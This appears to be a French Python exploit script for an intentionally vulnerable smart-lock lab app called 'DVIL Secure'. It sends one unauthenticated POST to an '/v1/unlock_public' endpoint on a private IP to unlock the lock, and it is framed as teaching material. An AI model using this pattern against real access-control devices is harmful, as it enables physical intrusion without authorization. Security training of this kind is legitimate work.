# ===================================================================================
#  
# 
#   $$$$$$$\  $$\    $$\ $$$$$$\ $$\                       $$$$$$$\                     $$\                           $$\ 
#   $$  __$$\ $$ |   $$ |\_$$  _|$$ |                      $$  __$$\                    $$ |                          $$ |
#   $$ |  $$ |$$ |   $$ |  $$ |  $$ |            $$\       $$ |  $$ |$$$$$$\  $$\   $$\ $$ | $$$$$$\   $$$$$$\   $$$$$$$ |
#   $$ |  $$ |\$$\  $$  |  $$ |  $$ |            \__|      $$$$$$$  |\____$$\ $$ |  $$ |$$ |$$  __$$\  \____$$\ $$  __$$ |
#   $$ |  $$ | \$$\$$  /   $$ |  $$ |                      $$  ____/ $$$$$$$ |$$ |  $$ |$$ |$$ /  $$ | $$$$$$$ |$$ /  $$ |
#   $$ |  $$ |  \$$$  /    $$ |  $$ |            $$\       $$ |     $$  __$$ |$$ |  $$ |$$ |$$ |  $$ |$$  __$$ |$$ |  $$ |
#   $$$$$$$  |   \$  /   $$$$$$\ $$$$$$$$\       \__|      $$ |     \$$$$$$$ |\$$$$$$$ |$$ |\$$$$$$  |\$$$$$$$ |\$$$$$$$ |
#   \_______/     \_/    \______|\________|                \__|      \_______| \____$$ |\__| \______/  \_______| \_______|
#                                                                          $$\   $$ |                                  
#                                                                          \$$$$$$  |                                  
#                                                                           \______/                                    
#  -------------------------------------------------------------------------------------------------------------------------------
#  -------------------------------------------------------------------------------------------------------------------------------
# DVIL SECURE – Exploit Niveau 2 
#
# Auteur       : Lysius [VIALETTE Lysandre]
# Date         : [29/02/2025]
# Objectif     : Exploitation en chaîne des vulnérabilités suivantes :
#                1. Faille Route non protéger 
#                
#         
#
# Description  : Ce script réalise une attaque complète sur l'application DVIL Secure,
#                exploitant successivement les failles critiques afin de démontrer
#                l'importance d'une bonne sécurité applicative.
#
# Avertissement: Ce script est uniquement destiné à un usage pédagogique et légal.
#                L'auteur décline toute responsabilité en cas d'utilisation abusive.
#
# Usage        : python3 exploit_Version_1.py
# ===================================================================================
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

def exploit_unlock_public(base_url="http://192.168.4.24:5000"):
    """
    Exploite la faille niveau 1 : /v1/unlock_public
    Aucun contrôle d’accès => n’importe qui peut déverrouiller la serrure
    """
    vuln_endpoint = f"{base_url}/v1/unlock_public"

    print("[*] Tentative d'exploitation de /v1/unlock_public ...")

    try:
        resp = requests.post(vuln_endpoint)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "unlocked":
                print("Succès : Serrure déverrouillée (faille niveau 1)")
            else:
                print("Échec inattendu : ", data)
        else:
            print(f"Erreur HTTP {resp.status_code} : {resp.text}")
    except Exception as e:
        print(f"Exception lors de la requête : {e}")

if __name__ == "__main__":
    exploit_unlock_public()
